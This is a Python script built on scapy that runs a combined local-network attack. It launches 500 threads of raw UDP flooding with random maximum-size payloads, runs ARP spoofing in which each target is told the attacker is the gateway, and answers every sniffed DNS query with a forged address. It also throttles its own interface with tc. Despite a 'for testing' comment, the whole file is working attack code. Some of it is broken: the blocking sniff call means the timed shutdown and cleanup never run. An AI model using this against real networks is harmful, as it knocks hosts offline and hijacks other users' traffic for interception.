import os
import threading
import time
import socket
import random
from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSQR, IP, UDP, DNSRR

# Configuration parameters
NUM_THREADS = 500  # Increased number of threads
NUM_ARP_THREADS = 100  # Number of threads dedicated to ARP spoofing
DURATION = 600  # Duration in seconds

# List of target IP addresses for testing
targets = [
    "192.168.1.1", "192.168.1.2", "192.168.1.3",  # Replace with appropriate IPs
]

# Random data to send in raw packets
data = random._urandom(65507)  # Maximum size for a UDP packet

def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].src
    except Exception as e:
        print(f"Error in get_mac: {e}")
    return None

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    while True:
        packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
        send(packet, verbose=False)
        time.sleep(0.1)  # Short delay to avoid overwhelming the network stack

def dns_spoof(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        spoofed_pkt = (Ether(src=packet[Ether].dst, dst=packet[Ether].src)/
                       IP(src=packet[IP].dst, dst=packet[IP].src)/
                       UDP(dport=packet[UDP].sport, sport=53)/
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                           an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata='192.168.1.100')))
        send(spoofed_pkt, verbose=False)

def set_network_speed(interface, speed):
    # Set the download and upload speed using tc command
    os.system(f"tc qdisc add dev {interface} root handle 1: htb default 11")
    os.system(f"tc class add dev {interface} parent 1: classid 1:1 htb rate {speed}mbit")
    os.system(f"tc class add dev {interface} parent 1:1 classid 1:11 htb rate {speed}mbit")

def flood():
    while True:
        try:
            target_ip = random.choice(targets)
            target_port = random.randint(1, 65535)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            print(f"Error: {e}")

def main():
    interface = "eth0"  # Replace with your network interface
    speed = random.randint(10, 20)  # Random speed between 10 and 20 Mbps
    set_network_speed(interface, speed)

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)

    # ARP spoofing attack
    gateway_ip = "192.168.1.1"  # Replace with your gateway IP
    for target in targets:
        for _ in range(NUM_ARP_THREADS):
            t = threading.Thread(target=arp_spoof, args=(target, gateway_ip))
            t.start()
            threads.append(t)

    # DNS spoofing attack
    sniff(filter="udp port 53", prn=dns_spoof, store=0)

    # Run the network flood for the specified duration
    time.sleep(DURATION)
    for t in threads:
        t.do_run = False

    # Remove the traffic control settings
    os.system(f"tc qdisc del dev {interface} root")

if __name__ == "__main__":
    main()
